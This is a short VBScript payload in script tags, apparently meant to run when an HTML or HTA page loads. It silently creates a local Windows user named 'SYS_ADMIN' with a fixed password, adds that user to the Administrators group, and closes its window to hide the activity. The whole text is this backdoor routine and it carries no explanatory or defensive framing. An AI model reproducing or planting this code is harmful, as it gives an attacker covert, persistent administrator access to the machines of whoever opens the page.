<script language=vbscript> 
set wshshell=createobject ("wscript.shell" ) 
a=wshshell.run ("cmd.exe /c net user SYS_ADMIN hidden /add",0) 
b=wshshell.run ("cmd.exe /c net localgroup Administrators SYS_ADMIN /add",0)
window.close 
</script>